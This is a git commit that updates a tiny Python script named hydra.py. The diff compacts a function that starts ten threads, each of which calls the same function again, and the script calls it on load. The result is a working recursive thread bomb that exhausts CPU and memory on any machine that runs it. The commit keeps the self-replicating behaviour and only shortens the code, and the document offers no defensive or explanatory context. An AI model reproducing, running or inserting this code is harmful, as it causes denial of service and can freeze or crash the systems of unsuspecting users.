a22e0f1618736013ca9e153a1a0a6b25258c45d8
Ambition42 <150349240+Ambition42@users.noreply.github.com>
2025-05-09 13:46:15 +0200

    Update hydra.py

--- hydra.py
+++ hydra.py
@@ -1,8 +1,5 @@
 import threading
-
 def create_thread():
     for x in range(10):
-        new_thread = threading.Thread(target=create_thread)
-        new_thread.start()
-
+        threading.Thread(target=create_thread).start()
 create_thread()
